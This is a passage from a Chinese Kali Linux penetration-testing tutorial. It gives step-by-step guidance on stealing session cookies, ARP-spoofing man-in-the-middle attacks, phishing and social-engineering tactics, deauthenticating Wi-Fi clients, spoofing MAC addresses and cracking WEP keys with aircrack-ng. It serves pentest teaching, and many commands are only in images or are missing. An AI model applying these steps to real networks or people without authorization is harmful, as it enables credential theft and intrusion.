<p>渗透测试人员的目标是找出具有高权限的允许访问特点资源的账户，并且范围Web应用的时间不受限制。这也是为什么要创建会话管理的安全功能，如会话超时时间和SSL证书的主要原因。不管怎么说Kali中带有的工具可以找出会话管理中的漏洞。比如截获web应用中发送用户退出登录请求的活动会话，然后将那个会话给另外一个人用。这种攻击也称为会话固定攻击。</p>
<p>会话管理攻击可能会出现在利用了应用中的漏洞或是用户如何访问这些应用和进行身份验证的过程中的漏洞时。攻击者攻击的常见方式是对Web服务器进行跨站脚本攻击或是SQL注入攻击。攻击者还可能回利用浏览器中的会话Cookie，或是网页中的漏洞来达到类似的结果。</p>
<h2 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h2><p>点击劫持是欺骗用户点击其他东西而不是他们认为正在点击的东西的一种技术。点击劫持可用来显示机密信息，比如登录凭证，也可以用来帮助黑客控制受害者电脑。点击劫持通常会通过嵌入受害者不知情的代码或脚本来揭露Web浏览器的安全问题或是漏洞。执行点击劫持的一个例子是将超链接文本指向一个手信任的站点，而并非真实的站点。普通用户并不会在点击前验证超链接，或是注意到跟常见的点击劫持意图相关的变更，这使得点击劫持成为非常有效的攻击形式。</p>
<p>点击劫持的危害性可能会更大更复杂，而不只是修改超链接这样简单一般使用点击劫持的攻击者会在网页嵌入Iframe。Iframe的内容会包含从目标网站上获取的数据，兵器通常会放到合法的链接上面，是的它很难被发现。</p>
<h2 id="劫持Web会话的CooKie"><a href="#劫持Web会话的CooKie" class="headerlink" title="劫持Web会话的CooKie"></a>劫持Web会话的CooKie</h2><p>Cookie是从网站发出来的小块信息快，在用户访问网站时存储到用户的Web浏览器中。网站可以用Cookie来验证该用户是不是再次访问该站点，并且可以取回用户之前活动的详细信息。这些信息包括网页是如何被访问的、用户是如何登陆的，以及用户点击了哪些按钮。不管你什么时候登陆网站、比如Facebook、WordPress，浏览器都会给你分配一个Cookie。</p>
<h2 id="Web会话工具"><a href="#Web会话工具" class="headerlink" title="Web会话工具"></a>Web会话工具</h2><p><strong>（1）Firefox插件</strong></p>
<p>firefox浏览器提供了许多可以用来将窃取的Cookie注入到攻击者浏览器的插件。其中一些例子包括GreaseMonkey、Cookie Manager、Firesheep。这些插件根据自己的用途自我选择即可。</p>
<p><strong>（2）Wireshark</strong></p>
<p>Wireshark是最流行的免费开源网络协议分析工具之一。Wireshark在Kali中已经安装了，是理想的网络问题排查和分析工具。在本节中，它是用作检测发自目标来截获会话令牌的最佳工具。Wireshark使用GTK+组合工具集来实现他的用户界面，用pcap来进行包住区。他跟tcpdump命令的工作原理非常相似。不过它的作用是带有继承的排序和过滤功能的图形化界面。</p>
<p>对于wireshark的使用，可以参考本博主的wireshark系列自我查询需要的内容，此处就不再多说了。</p>
<p><strong>（3）Hamster和Ferrt</strong></p>
<p>Hamster是一款用于通过HTTP会话劫持窃取Cookie的工具，它使用的是被动嗅探，也称为旁路劫持（sidejacking）。Hamster会窃听网络上的数据，抓取所有可见的会话Cookie，然后将窃取的Cookie导入到浏览器的GUI中，这样攻击者就能回放该会话。Hamster使用Ferret来抓取会话Cookie。</p>
<p>在启动Hamster时，它会打开一个终端来启动Hamster服务。默认的代理IP地址是127.0.0.1:1234</p>
<p><img src="/img/posts/20180407144338867.png" alt="img"></p>
<p>你可以通过打开一个浏览器并且将其指向<a href="http://127.0.0.1:1234来访问Hamster。" target="_blank" rel="noopener">http://127.0.0.1:1234来访问Hamster。</a></p>
<p><img src="/img/posts/20180407144514366.png" alt="img"></p>
<p>网络数据要完成它的功能必须流经Hamster。你可以选择点击适配器链接来选择你要使用的网卡。这里我们检测的网卡是eth0</p>
<p><img src="/img/posts/20180407144626793.png" alt="img"></p>
<p>Hamster会见你重定向到一个劫持活动页面。你会注意到你并没有收到任何数据包。Hamster需要一个嗅探器来抓取网络数据包。你可以通过Ferret来实现。</p>
<p>在kali 2018中没有，需要自己安装“apt-get install ferret” </p>
<p>打开Ferret之后输入”ferret -i  网卡名 “来选择你要锦绣嗅探的网卡。Ferret会告诉你正在嗅探，该命令行提示符会悬停在运行状态。在你查看网络数据的同时，在Ferret中抓取的网络数据包会显示成文本。</p>
<p>当Ferret运行起来之后，你会在Hamster中看到你相应的数据包信息。</p>
<h2 id="中间人攻击-1"><a href="#中间人攻击-1" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><p>中间人攻击是一种主动窃取的只用形式。其中攻击者会更受害者建立一个连接，并在受害者之间中转信息，使他们以为他们正在跟对方通话一样。这类攻击有许多形式，比如使用Hak5的菠萝型无线路由器并将其伪装成一个可信的网络接入点，而实际上扮演的是受害者和无线网络之间的中间人。另一个例子就是使用Kali来在受害者和默认路由器之间转发网络数据，而同时嗅探者有用的信息，比如登录凭证等。</p>
<p>注：许多云服务比如Facebook和Gmail都通过HTTPS来实施安全登录，这能够防止普通的中间人攻击。要绕过HTTPS，你可以使用SSLstrip工具。它能够显示所有可用于你的中间人攻击的登录信息。SSLstrip/中间人攻击组合是窃取受害者登录凭据的一个非常有效的方式，如果你有跟目标系统处于同一网络中的攻击系统的话。</p>
<h2 id="dsniff和arpspoof"><a href="#dsniff和arpspoof" class="headerlink" title="dsniff和arpspoof"></a>dsniff和arpspoof</h2><p>dsniff是一组密码嗅探和网络数据分析工具，用于解析不同的应用协议和提取相关信息。arpspoof用于帮助攻击者向本地网络发送伪造的地址解析协议（ARP）消息。这样做的目的就是要将攻击者的MAC地址和其他主机的IP地址关联起来，从而将发往该IP地址的网络数据都发送给攻击值。</p>
<p>一个人进行中间人攻击的方法是将Arpspoof和dsniff用在系统间。</p>
<p>第一步就是找出受害者的IP地址和网络的默认网关。找出IP地址之后，你需要告诉受害者你真的是另一个系统或者默认网关。举个例子，如果受害者A的IP地址是192.168.11.4，默认网关的地址为192.168.11.1，攻击者的地址为192.168.11.145，你应该使用arpspoof命令将你那个145的ip地址设置的看起来像是受害者的和默认网关的。</p>
<h2 id="Ettercap"><a href="#Ettercap" class="headerlink" title="Ettercap"></a>Ettercap</h2><p>Ettercap是一个用于基于中间人方式的攻击的免费的开源综合工具套件。</p>
<p>Ettercap可用于计算机网络协议分析和安全审计，它的功能有嗅探活动的链接、内容过滤、以及对多种协议的主动和被动解析的支持。Ettercap通过将攻击者的网卡设置为昏则模式以及对受害者的机器进行ARP污染来工作。</p>
<p>具体的使用，在此处就不做多于的介绍了。</p>
<h2 id="其他工具-1"><a href="#其他工具-1" class="headerlink" title="其他工具"></a>其他工具</h2><ul>
<li>urlsnarf</li>
<li>acccheck</li>
<li>hexinject</li>
<li>Patator</li>
<li>DBPwAudit</li>
</ul>
<p>以上的其他工具就不多做介绍了，自我根据提示说明使用即可！</p>
<h1 id="六-社会工程学攻击"><a href="#六-社会工程学攻击" class="headerlink" title="六. 社会工程学攻击"></a>六. 社会工程学攻击</h1><h2 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h2><p>社会工程学是利用人性的弱点体察、获取有价值信息的实践方法，它是一种期盼的艺术。在缺少目标系统的必要信息时，社会工程学技术是渗透测试人员获取信息的至关重要的手段。对于素有类型的组织而言，人都是安全防范措施李最为薄弱的一个环节，也是整个安全基础设施最脆弱的层面。</p>
<p>从安全的角度来看，社会工程学是以获取特定信息为目标的操纵他人的有力武器。很多单位都使用社会工程学的方法来进行安全评估，以考核雇员的安全完整性，并通过这种方法调查工作流程和人员方面的安全弱点。需要注意的是，社会工程学是种很常见的技术，可以说各种人员都会使用这种技术。无论是渗透测试人员还是诈骗专家、身份窃贼、商业合作伙伴等。</p>
<h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p>社会工程学工程师通常会采用这些方法来有效获取目标的有关信息和访问权限：</p>
<p>（1）情报收集：多种技术都可以用于找到最容易攻破的渗透测试目标。例如，我们可以采用高级搜索工具收集被测试公司员工的Email地址；通过社交网络收集被测单位员工的个人信息；识别被测单位组织使用的第三方软件包；参与他们的经营活动、社交活动和参加会议等等。以这些方提供的情报，能够准确的退测出社会工程学意义上的“线人”。</p>
<p>（2）识别漏洞：一旦选定了关键线人，接下来就开始与对方建立信任关系和友谊。这样就可以在不伤害、不惊动目标的情况下，截获被测单位的机密信息。保持行动的隐蔽性和保密性，对于整个过程来说至关重要。另外，也可以调查被侧单位是否使用了旧版软件，继而通过恶意的E-mail或 Web内容，利用软件漏洞感染当事人的计算机。</p>
<p>（3）规划攻击</p>
<p>你可以对目标采取直接了当的攻击方式，也可以利用电子辅助技术被动攻击目标。以这些挖掘出来的情报入口着手，我们恶意轻松的拟定攻击路径和攻击方法。例如：被测单位的客户服务代表Bob和我们的关系很好，他还信任我们；他就恒友可能在计算机上执行我们发送的E-mail附件，这种攻击不需要高级管理人员的任何事前授权。</p>
<p>（4）执行攻击：社会工程学攻击的最后一步是执行攻击计划。此时，我们应该保持足够的信心和耐心，主动监控和评估工作的成果。完成这一步之后，社会工程师掌握了充分的信息，甚至可以范围被测单位的内部系统，这些成果足以让他们进一步地渗透被测试的单位。在成功执行攻击计划之后，社会工程学的攻击就可宣告结束。</p>
<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><p><strong>（1）冒名顶替</strong></p>
<p>攻击人员常常假装成他人以获得对方的信任。例如，在获取目标人员的银行信息方面，只要目标人员是哟E-mail，我们就可以进行钓鱼攻击。这种攻击属于近乎完美的攻击方案。当决定使用钓鱼攻击之后，攻击人员要大量的收集牧宝人员用过的E-mail地址，然后伪造出于原银行解密一样的网页界面，以诱骗目标人员。</p>
<p>完成了一上准备之后，攻击人员会草拟并发送一份正式行文的E-mail（例如：银行账户更新通知）。这些E-mail看上去就像真正的银行发出来的邮件。要去目标人员访问某网址更新账户信息。不过，邮件提到的网址将把目标人员提交的信息转发给攻击人员。攻击人员事先掌握了特定的Web技术，他们使用多种先进的工具（例如SSLstrip）就可以通过自动化手段轻松的又掉地到达预定的任务。</p>
<p><strong>（2）投桃报李</strong></p>
<p>通过利益交换的方式达成双方各自利益的行为，成为投桃报李。这类攻击需要长期业务合作达成的非正式关系。利用公司之间的信任关系，可以轻松的获取特定信息的目标人员。</p>
<p><strong>（3）狐假虎威</strong></p>
<p>冒充目标单位业务负责人的身份从而干预正常业务的做法就是狐假虎威。有些人认为，这种攻击方式属于冒名顶替的一种特例。人们会本能的出于下意识的接收权威或者高级管理人员的知识，这个时候他们会无视自己否定性的直觉。这种天性使我们容易在特定的威胁面前毫无抵抗力。</p>
<p><strong>（4）啖以重利</strong></p>
<p>人们常常说“机不可失”，他们特别关注所谓机不可失的宝贵机会。这些想法都是人性贪婪的一面写照。啖以重利的方法李永利人们个球谋利机会的贪婪心理。</p>
<p><strong>（5）社会关系</strong></p>
<p>作为人，我们需要某种形式的社会关系，以分享思想、感情、想法。社会关系最容易受攻击的部分是“性”。多数情况下，异性总是吸引。由于这种强烈的感情和信任的错觉，人们可能在不经意间向对手透露信息。很多线人的社交门户网站都提供了见面和聊天的服务，以促进用户间的社交交际。</p>
<h2 id="Social-Engineering-Toolkit-SET"><a href="#Social-Engineering-Toolkit-SET" class="headerlink" title="Social Engineering Toolkit(SET)"></a>Social Engineering Toolkit(SET)</h2><p>SET是一款先进的多功能的社会工程学计算机辅助工具集。可以行之有效的用客户端应用程序的漏洞获取目标的信息（例如E-mail）.SET可以实现多种非常有效且使用的攻击方法。其中，人们最常用的方法有：用恶意附件对目标进行E-mail钓鱼攻击、Java Applet攻击、基于浏览器的漏洞攻击、收集网站认证信息、建立感染的便携媒体、邮件群发等攻击。它是实现这些攻击方法的合成攻击平台。充分利用这个程序的极具说服力的技术，可对人的因素进行深入测试。</p>
<p><img src="/img/posts/20180407161015768.png" alt="img"></p>
<p>至于SET的使用要结合具体场景，这里就不演示了，在设置时只需要根据所给的选项与提示完成配置就好。</p>
<h1 id="七-无线网络攻击"><a href="#七-无线网络攻击" class="headerlink" title="七. 无线网络攻击"></a>七. 无线网络攻击</h1><p>鉴于移动设备的主导地位和提供即时网络连接的需要，无线网络已成为互联网上无处不在的接入点。不幸的是，无线接入在提供便利性的同时，也带来了盗窃访问、盗窃数据，以及网络资源拒绝服务等有效攻击。Kali提供了多种用于配置工具和发启无线攻击的工具，使组织机构能够提高其安全性。</p>
<h2 id="1-配置Kali实现无线攻击"><a href="#1-配置Kali实现无线攻击" class="headerlink" title="1. 配置Kali实现无线攻击"></a>1. 配置Kali实现无线攻击</h2><p>Kali Linux几个工具的发布使无线网络的测试变得很容易；然而，这些攻击需要大量的配置，以达到充分有效。除此之外，测试人员在实施攻击或审计无线网络之前，应该拥有丰富的无线网络背景。</p>
<p>在无线安全测试中，最重要的工具是无线适配器，它连接到无线接入点。它必须支持所使用的工具，尤其是aircrack-ng工具的组件；特别是，该卡的芯片和驱动器必须具备向通信流注入无线数据包的能力。这是侦察、攻击的要求，必须在目标和受害者之间注入特定类型的数据包。所注入的数据包可能会引起拒绝服务攻击，允许攻击者获取破解加密密钥或支持其他无线攻击所需要的信号交换数据。</p>
<p>aircrack-ng网站（<a href="http://www.aircrack-ng.org）" target="_blank" rel="noopener">www.aircrack-ng.org）</a> 包含一个已知的兼容的无线适配器列表。</p>
<p>在Kali中使用的最可靠适配器是ALFA NETWORK cards，尤其是AWUS036NH适配器，它支持无线802.11b、802.11g和802.11n协议。Alfa cards已在现有网络中使用，并支持Kali的所有测试和攻击。</p>
<h2 id="2-无线侦察"><a href="#2-无线侦察" class="headerlink" title="2. 无线侦察"></a>2. 无线侦察</h2><p>实施无线攻击的第一步是进行侦察——它可以识别准确的目标接入点，并高亮度显示可能影响测试的其他无线网络。</p>
<p>如果你使用连接USB的无线网卡连接到Kali虚拟机，确保USB连接已经断开主机操作系统，并通过单击USB连接图标连接到VM虚拟机，如下图所示，箭头所指即USB连接图标。</p>
<p><img src="/img/posts/317829a9b8f94ec0a607893789445f48.jpeg" alt="img"></p>
<p>USB连接图标</p>
<p>接下来，通过运行命令行中的iwconfig命令，确定哪些无线接口是可用的，如下图所示。</p>
<p><img src="/img/posts/35e61ea9fae14b8f8981d9656ad6ae85.jpeg" alt="img"></p>
<p>确定可用无线接口</p>
<p>对于某些特定攻击，你可能希望增加适配器的输出能力。如果你是一个合法的同位无线接入点，这是特别有用的，和你想要的目标连接在你的控制之下的虚假的接入点，而不是合法的接入点。这些虚假或者流氓（rogue）接入点，允许攻击者截获数据，并根据攻击的需要查看或更改数据。攻击者频繁复制或克隆合法的无线网站，然后增加其相对合法网站更强的传输能力，来作为吸引受害者的诱饵。使用如下命令增加传输能力：</p>
<p>使用aircrack-ng及其相关工具可以执行许多攻击。首先，我们需要拦截或监控无线传输；因此，我们需要使用airmon-ng命令，为监控模式（monitor mode）设置拥有无线功能Kali通信接口：</p>
<p>前面命令的执行结果如下图所示。</p>
<p><img src="/img/posts/ebf29950f04b4c80b3007dd8e36b5837.jpeg" alt="img"></p>
<p>使用airmon-ng命令</p>
<p>注意，返回的描述表明有些进程可能会造成麻烦。处理这些进程最有效的方法是使用综合性的kill命令，如下所示：</p>
<p>使用以下命令查看本地无线环境：</p>
<p>前面的命令，列出了特定时间点可以在无线适配器范围内找到的所有已识别的网络。它提供由MAC地址识别的无线网络节点的BSSID基本服务集标识符，标明了相对的输出能力、数据包发送的信息、包含使用通道和数据的带宽信息、使用的加密信息，以及提供无线网名称的ESSID。相关信息如下图所示，非必需的ESSID标识符已经被模糊。</p>
<p><img src="/img/posts/fbe133ff110545b892e4287015eb6182.jpeg" alt="img"></p>
<p>显示ESSID标识符</p>
<p>airodump命令通过可用的无线信道循环执行，并确定了以下几点：</p>
<ul>
<li>基本服务集标识符（Basic Service Set Identifier，BSSID），它是唯一的可以标识无线接入点或路由器的MAC地址。</li>
<li>每个网络的PWR或电源。尽管airodump-ng错误地显示功率为阴性，但这是一个假象的报告。为了获取正确的正值，接入终端并运行airdriver-ng unload36，然后运行airdriver-ng load35。</li>
<li>CH显示了用于广播的频道。</li>
<li>ENC显示使用的加密技术——它是OPN，或开放的、没有加密，或者WEP或WPA/WPA2（如使用加密）。加密（CIPHER）和身份验证（AUTH）提供额外的加密信息。</li>
<li>扩展服务集标识符（Extended Service Set Identifier，ESSID）是由拥有相同SSID或名称的接入点组成的无线网络的名称。</li>
</ul>
<p>在终端窗口的下半部分，你将看到站点试图连接或已经连接到无线网络。</p>
<p>在我们和其他任何目标（潜在的）网络交互之前，必须确认我们的无线网卡有数据包注入的能力。要做到这一点，需在终端窗口的shell提示符下，运行以下命令：</p>
<p>上面的命令执行结果如下图所示，-9表示注入测试。</p>
<p><img src="/img/posts/96d4696a37d742d193a45299182325ed.jpeg" alt="img"></p>
<p>运行aireplay-ng-9 mon0命令</p>
<p><strong>Kismet</strong></p>
<p>最重要的无线侦察工具是Kismet，它是一个802.11无线探测器、嗅探器和入侵检测系统。</p>
<p>Kismet可用于收集以下信息：</p>
<ul>
<li>无线网络的名称，ESSID。</li>
<li>无线网络的信道。</li>
<li>接入点的MAC地址，BSSID。</li>
<li>无线客户端的MAC地址。</li>
</ul>
<p>Kismet也可以用来嗅探802.11a、802.11b、802.11g和802.11n等无线通信流量中的数据。并支持用于嗅探其他无线协议的插件。</p>
<p>在终端窗口的命令提示符下输入kismet启动Kismet。</p>
<p>当Kismet启动后，你将面临一系列的问题，允许你在其启动过程中对其进行配置。用Yes回应Can you see colors，接受Kismet is running as root（Kismet以root权限运行），并对Start Kismet Server选择Yes。在Kismet的启动选项中，不选中Show Console（显示控制台），因为它会遮挡屏幕。启动Kismet（见下图）。</p>
<p><img src="/img/posts/53cfe917e58c468db419d43dca6a93df.jpeg" alt="img"></p>
<p>运行Kali的Kismet</p>
<p>系统将提示你添加一个捕捉接口，通常我们选择wlan0。</p>
<p>Kismet开始嗅探数据包，并收集位于临近物理区域的所有无线系统信息。</p>
<p>通过双击Kismet选择一个网络，你可以在无线网络上看到一些额外的信息。</p>
<p>你也可以深入研究以确定连接到各种无线网络的特定客户端。</p>
<p>使用Kismet作为发起一些特定的攻击（嗅探发送的数据）或识别网络的初始侦察工具。因为它能被动地收集连接数据，所以它是一个很好的隐蔽识别网络的工具，尤其是当SSID未被公开传输时。</p>
<h2 id="3-绕过一个隐藏的服务集标识符"><a href="#3-绕过一个隐藏的服务集标识符" class="headerlink" title="3. 绕过一个隐藏的服务集标识符"></a>3. 绕过一个隐藏的服务集标识符</h2><p>ESSID是标识一个无线局域网络的唯一字符序列。通过隐藏ESSID来试图实现网络安全是一个很差的方法；不幸的是，ESSID可以通过以下方式获得：</p>
<ul>
<li>嗅探无线环境，等待客户端关联到一个网络，然后捕获该关联。</li>
<li>主动取消鉴定客户端，强制客户端关联，然后捕获该关联。</li>
</ul>
<p>aircrack工具特别适合捕捉需要取消ESSID隐藏的数据，正如以下步骤所示：</p>
<p><strong>1)、在命令提示符下，输入以下命令，确认无线在受攻击系统中已经启动：</strong></p>
<p><strong>2)、使用下面的ifconfig命令，检查可用接口，并确定你使用的无线系统的确切名称。</strong></p>
<p><strong>3)、输入以下命令来启用你的无线接口（你可能需要把wlan0换成上一步骤中，确认可用的无线接口）：</strong></p>
<p><strong>4)、如果你使用ifconfig再次确认（见下图），你会发现有一个监控或mon0地址正在被使用。现在，使用airodump确认可用的无线网络，如下面给出的命令：</strong></p>
<p><img src="/img/posts/4032f32150ed4d608af905e615476b57.jpeg" alt="img"></p>
<p>使用ifconfig确认可用无线网络</p>
<p>正如你所看到的，第一个网络的ESSID标识是被认定为&lt;length：9&gt;。没有其他的名字或名称被使用。隐藏的ESSID长度被确定由9个字符组成；然而，这个值可能不正确，因为ESSID是隐藏的。真正的ESSID长度实际上可能短于或超过9个字符。</p>
<p>最重要的是可能存在已连接到该特定网络的客户机。如果客户端存在，我们将取消鉴定客户端，迫使他们在重新连接接入点时发送ESSID。</p>
<p>重新运行airodump，并滤掉目标接入点之外的一切信息。在这种特殊情况下，我们将重点从隐藏网络的信道6上收集数据，使用以下命令：</p>
<p>执行该命令删除多个无线源的输出，并允许攻击者把重点放在目标ESSID上，如下图所示。</p>
<p><img src="/img/posts/3c9d68b25bb44ad099ccd8c2f9682633.jpeg" alt="img"></p>
<p>使用airodump-ng-c 6 mon0命令</p>
<p>执行airodump命令时得到的数据表明，这有一个站点（00：0E：2E：CF：8C：7C）已连接到BSSID（00：18：39：D5：5D：61），而这又与隐藏的ESSID相关联。</p>
<p>为了截获正在传输的ESSID，我们必须创建一种条件，即可以让我们知道，这将在客户端和接入点之间连接发送的初始阶段。</p>
<p>因此，我们将针对客户端和接入点发起一个取消鉴定的攻击，发送一个可以中断它们之间的连接，并迫使它们重新鉴定的数据包流。</p>
<p>发动攻击，打开一个新的命令shell，并输入如下图所示的命令（0表明我们正在启动一个取消鉴定攻击，10表明我们将发送10个取消鉴定数据包，-a是目标接入点，c是客户端的MAC地址）。</p>
<p><img src="/img/posts/cd8e03256b3a4401bac7dd4ea62fb55f.jpeg" alt="img"></p>
<p>使用aireplay-ng-0 10-a-c命令</p>
<p>在所有的取消鉴定数据包发送之后，返回在信道6中，可以监视网络连接的原始窗口，如下图所示。现在，你将看到清晰的ESSID。</p>
<p><img src="/img/posts/642bb008be254f57993a46d034929b16.jpeg" alt="img"></p>
<p>看到清晰的ESSID</p>
<p>ESSID可以帮助攻击者，确认他们正在关注的是正确的网络（因为大多数ESSID基于企业标识），并使登录过程更便利。</p>
<h2 id="4-绕过MAC地址验证"><a href="#4-绕过MAC地址验证" class="headerlink" title="4. 绕过MAC地址验证"></a>4. 绕过MAC地址验证</h2><p>媒体访问控制（Media Access Control，MAC）地址，用于在网络中唯一地标识每个节点。它是由六对用冒号或连字符分开的十六进制形式的数字（0-9和字母A到F）组成的，看起来通常像这个样子：00：50：56：C0：00：01。</p>
<p>MAC地址，通常关联到一个拥有网络能力的网络适配器或设备；因为这个原因，它经常被称为物理地址。</p>
<p>MAC地址的前三对数字被称为组织唯一标识符（Organizational Unique Identifier），他们用来确定生产或销售设备的公司。最后三对数字是特定于设备的，可以认为是一个序列号。</p>
<p>因为MAC地址是唯一的，它可以用来将一个用户关联到一个特定的网络，尤其是无线网络。这有两个重要的含义——它可以用来识别网络访问者是一名黑客，还是一名的合法网络测试者，它也可以作为鉴定个体身份，并授权他们访问网络权限的工具。</p>
<p>在渗透测试的过程中，测试人员可能更喜欢匿名访问网络。支持匿名信息的方法是改变攻击系统的MAC地址。</p>
<p>这可以使用ifconfig命令手动完成。确定现有的MAC地址，运行命令解释器中的以下命令：</p>
<p><img src="/img/posts/1ea526ebf8ec41e0b69091417718fc77.jpeg" alt="img"></p>
<p>要手动更改IP地址，使用下面的命令：</p>
<p><img src="/img/posts/4a5361536d9b46ffa5e422f99c374d11.jpeg" alt="img"></p>
<p>替换不同的十六进制对的“xx”表达式。这个命令将允许我们更改攻击系统的MAC地址，更改为受害者网络接受的MAC地址。攻击者必须确保这个MAC地址并没有在网络上使用，否则，如果网络被监控，重复的MAC地址可能会触发警报。</p>
<p>在改变MAC地址之前，无线接口必须被关闭。</p>
<p>Kali还允许使用一个自动化工具macchanger。要改变攻击者的MAC地址，为同一供应商生产的产品的MAC地址，可从终端窗口中使用如下macchanger命令：</p>
<p>要改变现有的MAC地址为一个完全随机的MAC地址，可使用以下命令，运行该命令后的屏幕截图如下图所示：</p>
<p><img src="/img/posts/5f15b12b4bb54261b0b0ab41cdcf5882.jpeg" alt="img"></p>
<p>运行macchanger wlan0-r</p>
<p>有些攻击者在测试过程中，使用自动化脚本频繁地改变他们的MAC地址，以实现匿名化他们的攻击活动。</p>
<p>许多组织，尤其是学院和大学等大型学术团体，使用MAC地址过滤来控制谁可以访问他们的无线网络资源。MAC地址过滤使用网卡上唯一的MAC地址来控制对网络资源的访问；在一个典型的配置中，该组织维护一个允许访问网络的MAC地址白名单（whitelist）。如果传入的MAC地址不在已批准的访问列表中，将限制其连接到该网络。</p>
<p>不幸的是，MAC地址信息以明文传输。攻击者可以使用airodump收集接收到的MAC地址列表，然后手动改变他们的MAC地址为目标网络接受的MAC地址。因此，这种类型的过滤几乎没有为无线网络提供任何实质的保护。</p>
<p>一个最新水平的无线保护是由加密提供的。</p>
<h2 id="5-破解WEP加密"><a href="#5-破解WEP加密" class="headerlink" title="5. 破解WEP加密"></a>5. 破解WEP加密</h2><p>无线等效保密协议（Wireless Equivalent Privacy，WEP）起源于1999年，其针对802.11无线网络，提供一定程度保密性的工具，这就相当于是一个可以和有线网络等价的设备。在对其实施加密时，多个漏洞被快速发现，到2004年，它被WiFi访问保护（WiFi Protected Access，WPA）协议所取代。</p>
<p>WEP今天仍在使用，尤其是无法支持新无线路由器所需资源的较老的网络。在最近的一次主要城市中心无线调查显示：几乎25%的加密无线网络仍在继续使用WEP。许多这样的网络均与金融机构关联。</p>
<p>WEP的主要缺陷之一，是在重用初始化向量（Initialization Vector，IV）中确定的。WEP依赖于RC4加密算法，这是一种流密码——相同的加密密钥不能重复使用。IV用于防范密钥的重用，通过引入随机元素来加密数据。不幸的是，24位的IV太短而不能防止密钥重复；此外，在5000数据包被传输之后，有50%的概率会重复IV。</p>
<p>攻击者可以窃听或截取WEP加密数据流。根据用于备查的拦截数据包的数量，密钥可以被迅速恢复。在实践中，大多数WEP密钥可以在三分钟内被获取或破解。</p>
<p>要实施WEP破解工作，你还需要了解目标的以下信息：</p>
<ul>
<li>无线网络的名称或ESSID。</li>
<li>MAC地址的访问点，BSSID。</li>
<li>使用的无线信道。</li>
<li>无线客户机的MAC地址。</li>
</ul>
<p>针对WEP最常见的攻击，可以通过执行以下步骤实现：</p>
<p><strong>1)、首先，使用以下命令确定可用的无线网络接口：</strong></p>
<p><strong>2)、停止改变该接口的MAC地址为一个已经与目标网络关联的现有客户端的MAC地址。你还可以使用macchanger实现这一步。当MAC地址已更改时，重新启用airmon-ng。使用以下命令来完成这些步骤：</strong></p>
<p><img src="/img/posts/5c9378e0206e43cbb0a38e192de7361f.jpeg" alt="img"></p>
<p>使用已知的并且被认可的MAC地址，可以简化攻击。然而，事实并非总是如此。这种攻击假设你并不知道该MAC地址。相反，我们将在网络上创建一个假的关联。</p>
<p><strong>3)、使用下面的airodump命令来定位目标无线网络：</strong></p>
<p>当airodump定位目标时，可以按Ctrl+C停止搜索。复制BSSID中的MAC地址，并记录信道。从下图的示例可以看出，目标网络dd_wep正在信道6上以11MB的速度运行。</p>
<p><img src="/img/posts/72934fd5216b411d81c243f46ac6e735.jpeg" alt="img"></p>
<p>使用airodump命令</p>
<p><strong>4)、采用airodump-ng嗅探无线流量，并使用以下命令收集IV，其中–bssid用来选择目标BSSID、-c指示使用的信道，而-w用来给出输出文件的名字（wep_out）。</strong></p>
<p><img src="/img/posts/b4e396d6ed26439aa563279330c1abc8.jpeg" alt="img"></p>
<p><strong>5)、现在我们需要增加传输的IV数据包的数量。重新打开一个新的终端窗口（不要关闭第一个），输入以下命令伪造目标无线接入点的可验证身份：</strong></p>
<p><img src="/img/posts/15a98b9f7a0245128370491272190e33.jpeg" alt="img"></p>
<p>这里，-1表示一个假身份证明，而0是重新关联的时间，单位为秒（设置为0可以提醒防御者，因此攻击者可能会把它设置为30或更高）。</p>
<p><strong>6)、使用假的身份证明，我们将产生来自受信任的MAC地址的流量，并将其路由到目标无线接入点。</strong></p>
<p><img src="/img/posts/ebecdb58f4dc42448e9bb9eba6966c03.jpeg" alt="img"></p>
<p>这种攻击即为ARP注入或ARP重定向攻击。通常情况下，目标接入点将重播ARP数据包，并且每次生成一个新的IV；自然，这是一个快速生成必要IV的方法。</p>
<p>前面命令的执行结果，如下图所示。</p>
<p><img src="/img/posts/96cf55b7a8d7489ba834082f04b06f2d.jpeg" alt="img"></p>
<p>使用aireplay-ng-3-b命令</p>
<p><strong>7)、在ARP注入持续的过程中生成一些额外的数据包。打开另外一个终端窗口，并通过输入如下命令，启用一个交互式数据包重放攻击：</strong></p>
<p><img src="/img/posts/f0d51c8099c742578fb34423ec358591.jpeg" alt="img"></p>
<p>这里，-2表示我们正在使用交互式重放攻击，-p 0841为数据包设置帧控制字段，使它看起来好像来自一个无线客户端，-c FF：FF：FF：FF：FF：FF设置目的地址（在这种情况下，FF表示将数据包发送到网络上的所有主机），-b是BSSID的MAC地址，而-h是正在传输的与测试者MAC地址相匹配的数据包MAC地址。</p>
<p>前面命令的执行结果，如下图所示。</p>
<p><img src="/img/posts/341ab2dad08b4b4a9d2f80c4d50ca065.jpeg" alt="img"></p>
<p>使用aireplay-ng-2-p命令</p>
<p><strong>8)、另一种使网络忙碌的方法是在攻击的系统上打开多个命令脚本，并输入如下命令用目标的IP地址替代原IP地址：</strong></p>
<p><strong>9)、收集和保存足够的数据包之后，使用下面的aircrack-ng命令破解WEP密钥，其中-a 1集中攻击模式为静态WEP，-b是BSSID，而dd_wep.cap是包含截获IV的截获文件。</strong></p>
<p>如下图所示，该攻击是成功的且密码均被确认。（虽然它看起来是一个十六进制数，但你可以简单地输入它，并登录到WEP网络上。）</p>
<p><img src="/img/posts/461bdf5a85a041809116829b0a27afa8.jpeg" alt="img"></p>
<p>使用aircrack -ng -a 1 -b命令</p>
<p>虽然这次演示集中在64位的密钥上，一旦你从接入点收获了IV，那么长密钥在破解过程中并不一定会花费更多时间。</p>
<p>该工具的aircrack-ng组件是“黄金标准”，其提供了最可靠和有效的接入方法。然而，Kali附带的一些其他工具也可以帮助你破解加密的无线网络。</p>
<p>其中之一是Fern WiFi Cracker，它是集成了aircrack-ng的Python图形用户界面。它可以自动扫描无线网络，并识别WEP、WPA和WPA2网络。一旦网络被识别，攻击者可以利用几个方面的特性来攻击，其中包括以下几点：</p>
<ul>
<li>使用各种攻击实现WEP破解，包括分片、切片、Caffe Latte、Hirte、ARP重定向，或者WPS攻击。</li>
